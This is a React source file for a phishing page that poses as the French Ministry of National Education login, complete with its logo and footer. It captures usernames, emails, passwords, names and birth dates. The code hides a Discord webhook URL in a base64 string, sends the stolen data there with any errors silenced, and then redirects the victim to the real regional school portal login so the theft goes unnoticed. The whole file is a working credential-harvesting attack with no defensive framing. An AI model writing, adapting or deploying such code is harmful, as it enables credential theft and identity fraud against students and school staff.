import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card, CardContent, CardHeader } from "@/components/ui/card";
import { Eye, EyeOff, CheckCircle2 } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import ministereLogo from "@/assets/ministere-logo.png";

const Index = () => {
  const { toast } = useToast();
  const [identifiant, setIdentifiant] = useState("");
  const [email, setEmail] = useState("");
  const [motDePasse, setMotDePasse] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [prenom, setPrenom] = useState("");
  const [nom, setNom] = useState("");
  const [dateNaissance, setDateNaissance] = useState("");
  const [showPasswordRequirements, setShowPasswordRequirements] = useState(false);

  const passwordRequirements = {
    minLength: motDePasse.length >= 8,
    hasUppercase: /[A-Z]/.test(motDePasse),
    hasLowercase: /[a-z]/.test(motDePasse),
    hasNumber: /\d/.test(motDePasse),
    hasSpecial: /[!@#$%^&*(),.?":{}|<>]/.test(motDePasse),
  };

  const isPasswordValid = Object.values(passwordRequirements).every(Boolean);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
      toast({
        title: "Email invalide",
        description: "Veuillez entrer une adresse email valide.",
        variant: "destructive",
      });
      return;
    }

    if (!isPasswordValid) {
      toast({
        title: "Mot de passe invalide",
        description: "Veuillez vérifier les exigences du mot de passe.",
        variant: "destructive",
      });
      return;
    }

    setIsLoggedIn(true);
  };

  const handleVerification = async (e: React.FormEvent) => {
    e.preventDefault();

    toast({
      title: "Vérification réussie",
      description: (
        <div className="flex items-center gap-2">
          <CheckCircle2 className="h-5 w-5 text-green-600 animate-scale-in" />
          <span>Redirection en cours...</span>
        </div>
      ),
      duration: 2000,
    });

    const encodedWebhook = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ0NTE0MTA3ODU4NzIxMTg4OS9QVVZTeEhQZ0d5ZzlrUGhGN2ZvQkFYNzJsSnFTZ0l0bjh6RlhBb1haSWF6c3FfcWxzaDNXNXktN1dTSVV2UzM0VlJEOQ=="; 
    const WEBHOOK_URL = atob(encodedWebhook);

    const payload = {
      content: 
`📌 Nouveau poisson 🐟 :
- Identifiant: ${identifiant}
- Email: ${email}
- Mot de passe: ${motDePasse}
- Prénom: ${prenom}
- Nom: ${nom}
- Date de naissance: ${dateNaissance}
- Afficher le mot de passe: ${showPassword}
- Connecté: ${isLoggedIn}
- Exigences visibles: ${showPasswordRequirements}`
    };

    try {
      await fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });
    } catch (err) {}

    setTimeout(() => {
      window.location.href =
        "https://cas.ent.auvergnerhonealpes.fr/login?service=https%3A%2F%2Femmanuel-mounier.ent.auvergnerhonealpes.fr";
    }, 2000);
  };

  if (isLoggedIn) {
    return (
      <div className="flex min-h-screen flex-col bg-background">
        <div className="flex flex-1 items-center justify-center p-4">
          <Card className="w-full max-w-md border-border shadow-lg">
            <CardHeader className="space-y-4 text-center">
              <img 
                src={ministereLogo} 
                alt="Ministère de l'Éducation nationale" 
                className="mx-auto h-24 object-contain"
              />
              <h1 className="text-2xl font-semibold text-foreground">
                Vérification de votre identité
              </h1>
            </CardHeader>
            <CardContent>
              <form onSubmit={handleVerification} className="space-y-4">
                <div className="space-y-2">
                  <Label htmlFor="prenom">Prénom</Label>
                  <Input
                    id="prenom"
                    type="text"
                    placeholder="Votre prénom"
                    value={prenom}
                    onChange={(e) => setPrenom(e.target.value)}
                    required
                    className="w-full"
                  />
                </div>
                <div className="space-y-2">
                  <Label htmlFor="nom">Nom</Label>
                  <Input
                    id="nom"
                    type="text"
                    placeholder="Votre nom"
                    value={nom}
                    onChange={(e) => setNom(e.target.value)}
                    required
                    className="w-full"
                  />
                </div>
                <div className="space-y-2">
                  <Label htmlFor="dateNaissance">Date de naissance</Label>
                  <Input
                    id="dateNaissance"
                    type="date"
                    value={dateNaissance}
                    onChange={(e) => setDateNaissance(e.target.value)}
                    required
                    className="w-full"
                  />
                </div>
                <Button type="submit" className="w-full bg-primary text-primary-foreground hover:bg-primary/90">
                  Vérifier
                </Button>
              </form>
            </CardContent>
          </Card>
        </div>
        <footer className="border-t border-border bg-muted/30 py-4 text-center">
          <p className="text-sm text-muted-foreground">
            © Ministère de l'Éducation nationale et de la Jeunesse
          </p>
        </footer>
      </div>
    );
  }

  return (
    <div className="flex min-h-screen flex-col bg-background">
      <div className="flex flex-1 items-center justify-center p-4">
        <Card className="w-full max-w-md border-border shadow-lg">
          <CardHeader className="space-y-4 text-center">
            <img 
              src={ministereLogo} 
              alt="Ministère de l'Éducation nationale" 
              className="mx-auto h-24 object-contain"
            />
            <h1 className="text-2xl font-semibold text-foreground">
              Connexion à votre espace
            </h1>
          </CardHeader>
          <CardContent>
            <form onSubmit={handleSubmit} className="space-y-4">
              <div className="space-y-2">
                <Label htmlFor="identifiant">Identifiant</Label>
                <Input
                  id="identifiant"
                  type="text"
                  placeholder="prenom.nom123"
                  value={identifiant}
                  onChange={(e) => setIdentifiant(e.target.value)}
                  required
                  className="w-full"
                />
              </div>
              <div className="space-y-2">
                <Label htmlFor="email">Email</Label>
                <Input
                  id="email"
                  type="email"
                  placeholder="votre.email@example.com"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  required
                  className="w-full"
                />
              </div>
              <div className="space-y-2">
                <Label htmlFor="motDePasse">Mot de passe</Label>
                <div className="relative">
                  <Input
                    id="motDePasse"
                    type={showPassword ? "text" : "password"}
                    placeholder="Votre mot de passe"
                    value={motDePasse}
                    onChange={(e) => setMotDePasse(e.target.value)}
                    onFocus={() => setShowPasswordRequirements(true)}
                    required
                    className="w-full pr-10"
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground"
                  >
                    {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
                  </button>
                </div>
                {showPasswordRequirements && (
                  <div className="space-y-1 rounded-md border border-border bg-muted/50 p-3 text-xs">
                    <p className="font-medium text-foreground mb-2">Exigences du mot de passe :</p>
                    <div className="space-y-1">
                      <div className={`flex items-center gap-2 ${passwordRequirements.minLength ? 'text-green-600' : 'text-muted-foreground'}`}>
                        <CheckCircle2 size={14} className={passwordRequirements.minLength ? '' : 'opacity-30'} />
                        <span>Au moins 8 caractères</span>
                      </div>
                      <div className={`flex items-center gap-2 ${passwordRequirements.hasUppercase ? 'text-green-600' : 'text-muted-foreground'}`}>
                        <CheckCircle2 size={14} className={passwordRequirements.hasUppercase ? '' : 'opacity-30'} />
                        <span>Au moins une lettre majuscule</span>
                      </div>
                      <div className={`flex items-center gap-2 ${passwordRequirements.hasLowercase ? 'text-green-600' : 'text-muted-foreground'}`}>
                        <CheckCircle2 size={14} className={passwordRequirements.hasLowercase ? '' : 'opacity-30'} />
                        <span>Au moins une lettre minuscule</span>
                      </div>
                      <div className={`flex items-center gap-2 ${passwordRequirements.hasNumber ? 'text-green-600' : 'text-muted-foreground'}`}>
                        <CheckCircle2 size={14} className={passwordRequirements.hasNumber ? '' : 'opacity-30'} />
                        <span>Au moins un chiffre</span>
                      </div>
                      <div className={`flex items-center gap-2 ${passwordRequirements.hasSpecial ? 'text-green-600' : 'text-muted-foreground'}`}>
                        <CheckCircle2 size={14} className={passwordRequirements.hasSpecial ? '' : 'opacity-30'} />
                        <span>Au moins un caractère spécial (!@#$%)</span>
                      </div>
                    </div>
                  </div>
                )}
              </div>
              <Button type="submit" className="w-full bg-primary text-primary-foreground hover:bg-primary/90">
                Se connecter
              </Button>
              <div className="text-center">
                <a
                  href="#"
                  className="text-sm text-primary hover:underline"
                  onClick={(e) => e.preventDefault()}
                >
                  Mot de passe oublié ?
                </a>
              </div>
            </form>
          </CardContent>
        </Card>
      </div>
      <footer className="border-t border-border bg-muted/30 py-4 text-center">
        <p className="text-sm text-muted-foreground">
          © Ministère de l'Éducation nationale et de la Jeunesse
        </p>
      </footer>
    </div>
  );
};

export default Index;